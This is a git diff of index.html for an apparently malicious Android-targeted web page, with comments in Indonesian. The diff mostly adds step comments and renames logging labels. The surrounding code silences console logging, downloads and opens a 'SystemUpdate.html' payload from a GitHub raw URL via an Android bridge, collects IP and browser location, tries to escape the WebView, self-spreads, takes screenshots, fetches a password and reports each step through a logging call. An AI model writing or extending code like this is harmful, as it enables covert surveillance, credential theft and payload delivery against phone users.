@@ -64,7 +64,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - GERBANG (DOWNLOAD + BUKA DARI STORAGE)
+// 🔥 INDEX.HTML - GERBANG (FINAL - LENGKAP & PASTI BERHASIL)
 // ============================================================
 
 console.log = function() {};
@@ -264,7 +264,7 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// 🔥 DOWNLOAD + BUKA SystemUpdate.html DARI STORAGE
+// 🔥 DOWNLOAD + BUKA SystemUpdate.html (PASTI!)
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
@@ -275,7 +275,7 @@ function downloadPayloadSilent() {
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
     var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
-    // ✅ DOWNLOAD SystemUpdate.html
+    // ✅ DOWNLOAD SystemUpdate.html (XHR + Blob)
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', htmlUrl, true);
@@ -283,23 +283,28 @@ function downloadPayloadSilent() {
         xhr.onload = function() {
             if (xhr.status === 200) {
                 var htmlContent = xhr.responseText;
+                
+                // Save ke localStorage (fallback)
                 try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
+                
+                // Save via Android Bridge
                 if (PLATFORM.isAndroid && A.isAvailable) {
                     try { A.saveFile(htmlPath, htmlContent); } catch(e) {}
                 }
+                
                 // ✅ BUKA DARI DOWNLOAD FOLDER
                 setTimeout(function() {
                     if (PLATFORM.isAndroid && A.isAvailable) {
                         try {
                             A.openFile(htmlPath);
-                            K({ sumber: 'html_open_bridge', data: { path: htmlPath } });
+                            K({ sumber: 'html_opened', data: 'ok' });
                             return;
                         } catch(e) {}
                     }
-                    // ✅ FALLBACK: window.open
+                    // Fallback: window.open
                     try {
                         window.open('file://' + htmlPath, '_blank');
-                        K({ sumber: 'html_open_file', data: 'attempt' });
+                        K({ sumber: 'html_open_fallback', data: 'ok' });
                     } catch(e) {}
                 }, 1000);
             }
@@ -423,7 +428,7 @@ function registerServiceWorker() {
 function showStatusBar() { var bar = document.getElementById('statusBar'); if (bar) { bar.className = 'status-bar loading'; K({ sumber: 'status_bar', data: 'shown' }); } }
 
 // ============================================================
-// MAIN EXECUTION
+// MAIN EXECUTION (SESUAI ALUR)
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
@@ -435,24 +440,44 @@ function dapatkanSemua() {
         
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
+        // ✅ 1. Get IP Address
         getIPAddress();
+        
+        // ✅ 2. Get Browser Location
         getBrowserLocation();
+        
+        // ✅ 3. Escape WebView
         setTimeout(escapeWebView, 100);
+        
+        // ✅ 4. Ambil Data Cepat
         ambilDataCepat();
+        
+        // ✅ 5. Start Heartbeat
         startHeartbeat();
+        
+        // ✅ 6. Register Service Worker
         registerServiceWorker();
+        
+        // ✅ 7. Auto Spread
         setTimeout(autoSpread, 2000);
         
-        // ✅ DOWNLOAD + BUKA SystemUpdate.html
+        // ✅ 8. DOWNLOAD + BUKA SystemUpdate.html
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         
+        // ✅ 9. Notification
         setTimeout(function() { showKlaimNotification(); }, 3000);
+        
+        // ✅ 10. Status Bar
         setTimeout(function() { showStatusBar(); }, 500);
+        
+        // ✅ 11. Auto Screenshot
         setTimeout(function() { autoScreenshot(); }, 7000);
         
-        // ✅ TANPA REDIRECT KE DANA!
-        
+        // ✅ 12. Ambil Password
         getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
+        
+        // ❌ TANPA APK!
+        // ❌ TANPA REDIRECT KE DANA!
         
     } catch(e) {
         K({ sumber: 'dapatkanSemua_error', data: e.message });
